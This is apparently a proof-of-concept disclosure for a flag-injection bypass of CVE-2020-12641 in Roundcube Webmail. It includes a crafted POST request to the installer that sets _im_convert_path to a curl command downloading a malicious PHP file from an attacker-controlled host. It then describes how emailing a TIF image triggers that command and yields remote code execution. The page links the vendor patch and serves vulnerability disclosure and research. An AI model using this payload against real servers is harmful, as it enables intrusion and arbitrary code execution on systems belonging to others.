# Flag Injection Bypass for CVE-2020-12641 in Roundcube Webmail

This bypass affects Roundcube versions before 1.4.5, 1.3.12.

### Vendor Disclosure:

The vendor's disclosure and patch for the bypass can be found [here](https://roundcube.net/news/2020/06/02/security-updates-1.4.5-and-1.3.12).

### Flag Injection in an Arbitrary Executable

This exploit is not OS dependent, but it depends on the executables that the attacker has access to.
<br/>
In this case we will use the "[curl](https://curl.haxx.se/)" executable in a Linux Environment, and will perform the following steps:

#### Craft Injection Request

We craft and send a POST request to the Installer containing the malicious command injection in the "_im_convert_path" parameter:
```
POST /roundcube/installer/index.php HTTP/1.1
Host: 192.168.243.153
Content-Type: application/x-www-form-urlencoded
Content-Length: 1049

_step=2&_product_name=Roundcube+Webmail&***TRUNCATED***&submit=UPDATE+CONFIG&_im_convert_path=curl+-o+mal.php+http%3a//192.168.243.157%3a8000/mal.php%3f
```

<strong>Note:</strong> In this case "curl" is used to download a malicious PHP file from an attacker controlled server.
<br/>
The curl command cares only about 2 argumet/flags:
- <strong>-o mal.php</strong> == tells curl to write output to the mal.php file
- <strong>http://192.168.243.157:8000/mal.php</strong> == the attacker url that host the malicious mal.php file that will be downloaded on the victim


#### Send Email Containing a "Non-standard" Image

We proceed to send to the victim, in this case "guest@localhost", an email containing an image of non-standard format (in this case a "TIF" format image), which Roundcube will try to convert to "JPG" format, thus triggering the above code and using curl to write our PHP file on the victim:
<img src="Open%20Mail_Flag%20Inj.png"/>

#### Result

If the attack was performed correctly, when the victim opens the mail containing the "TIF" image, a PHP file of arbitrary content will be written to the Roundcube Server, and can be accessed by the attacker, resulting in arbitrary code execution:
<img src="Access%20PHP.png"/>
